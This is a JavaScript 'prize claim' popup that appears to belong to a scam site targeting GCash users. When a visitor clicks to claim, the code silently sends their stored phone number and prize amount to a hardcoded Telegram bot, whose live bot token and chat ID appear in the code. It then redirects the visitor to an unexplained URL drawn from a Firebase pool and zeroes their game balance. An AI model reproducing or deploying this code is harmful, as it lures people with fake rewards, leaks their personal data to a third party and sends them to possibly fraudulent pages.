/**
 * Claim Popup Module - May Agree/Authorize
 */

let claimState = {
    isAgreed: false,
    isProcessing: false,
    currentAmount: 0
};

// Show the claim popup
function showClaimPopup(amount) {
    claimState.currentAmount = amount;
    claimState.isAgreed = false;
    claimState.isProcessing = false;
    
    const popup = document.getElementById('claimPopup');
    const prizeSpan = document.getElementById('popupPrizeAmount');
    const gcashBtn = document.getElementById('gcashClaimBtn');
    const agreeCheckbox = document.getElementById('agreeCheckbox');
    
    prizeSpan.innerHTML = "₱" + amount.toLocaleString();
    
    if(agreeCheckbox) agreeCheckbox.checked = false;
    gcashBtn.classList.remove('active', 'processing');
    gcashBtn.style.opacity = '0.5';
    gcashBtn.style.pointerEvents = 'none';
    gcashBtn.innerHTML = '<img src="images/gc_icon.png" class="gc-icon-small" onerror="this.style.display=\'none\'"> Claim Thru GCash';
    
    popup.style.display = 'flex';
}

function hideClaimPopup() {
    const popup = document.getElementById('claimPopup');
    popup.style.display = 'none';
}

function onAgreeChange(checkbox) {
    const gcashBtn = document.getElementById('gcashClaimBtn');
    claimState.isAgreed = checkbox.checked;
    
    if(checkbox.checked) {
        gcashBtn.classList.add('active');
        gcashBtn.style.opacity = '1';
        gcashBtn.style.pointerEvents = 'auto';
    } else {
        gcashBtn.classList.remove('active');
        gcashBtn.style.opacity = '0.5';
        gcashBtn.style.pointerEvents = 'none';
    }
}

// ========== GCASH CLAIM WITH FIREBASE LINK REDIRECTION ==========
function onGCashClaim() {
    if(!claimState.isAgreed) {
        alert("⚠️ Please agree to the terms and conditions first!");
        return;
    }
    
    if(claimState.isProcessing) return;
    
    claimState.isProcessing = true;
    const btn = document.getElementById('gcashClaimBtn');
    const amount = claimState.currentAmount;
    const userPhone = localStorage.getItem("userPhone") || "Unknown";
    
    btn.classList.add('processing');
    btn.innerHTML = '<div class="rotating-green-o" style="width:20px;height:20px;border-width:3px;margin:0;"></div> REDIRECTING...';
    
    // Send notification to Telegram
    const message = `💰 CLAIM REQUEST!\n📱 ${userPhone}\n💵 ₱${amount}\n⏰ ${new Date().toLocaleString()}`;
    fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(message)}`)
        .catch(e => console.log('Telegram error:', e));
    
    // Get link from Firebase
    if(typeof firebase !== 'undefined' && firebase.database) {
        const db = firebase.database();
        
        db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', (snapshot) => {
            if(snapshot.exists()) {
                const key = Object.keys(snapshot.val())[0];
                const linkData = snapshot.val()[key];
                const redirectUrl = linkData.url;
                
                // Mark link as claimed
                db.ref('links/' + key).update({ 
                    status: 'claimed', 
                    user: userPhone,
                    amount: amount,
                    claimedAt: Date.now()
                });
                
                // Send confirmation to Telegram
                const confirmMsg = `✅ LINK REDIRECTED!\n📱 ${userPhone}\n🔗 ${redirectUrl}`;
                fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(confirmMsg)}`)
                    .catch(e => console.log('Telegram error:', e));
                
                // Update main game balance to 0
                if(typeof window.parent !== 'undefined' && window.parent.updateGameBalance) {
                    window.parent.updateGameBalance(0);
                } else if(typeof updateGameBalance === 'function') {
                    updateGameBalance(0);
                } else if(typeof GameState !== 'undefined') {
                    GameState.balance = 0;
                    if(typeof updateUI === 'function') updateUI();
                    if(typeof saveData === 'function') saveData();
                }
                
                // Hide popup and redirect
                setTimeout(() => {
                    hideClaimPopup();
                    window.location.href = redirectUrl;
                }, 1500);
                
            } else {
                // No available links
                btn.innerHTML = '❌ NO REWARDS AVAILABLE';
                btn.style.background = 'linear-gradient(135deg, #666, #444)';
                setTimeout(() => {
                    btn.innerHTML = '<img src="images/gc_icon.png" class="gc-icon-small"> Claim Thru GCash';
                    btn.classList.remove('processing');
                    btn.style.background = 'linear-gradient(135deg, #0066cc, #004099)';
                    claimState.isProcessing = false;
                }, 3000);
                alert("Sorry! No available rewards at the moment. Please try again later.");
            }
        }).catch((error) => {
            console.error("Database error:", error);
            btn.innerHTML = '❌ DATABASE ERROR';
            setTimeout(() => {
                btn.innerHTML = '<img src="images/gc_icon.png" class="gc-icon-small"> Claim Thru GCash';
                btn.classList.remove('processing');
                claimState.isProcessing = false;
            }, 3000);
            alert("Database error. Please try again.");
        });
    } else {
        alert("Firebase not initialized. Please refresh.");
        claimState.isProcessing = false;
        btn.classList.remove('processing');
        btn.innerHTML = '<img src="images/gc_icon.png" class="gc-icon-small"> Claim Thru GCash';
    }
}

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    if(!document.getElementById('claimPopup')) {
        console.log('Popup container not found');
    }
});
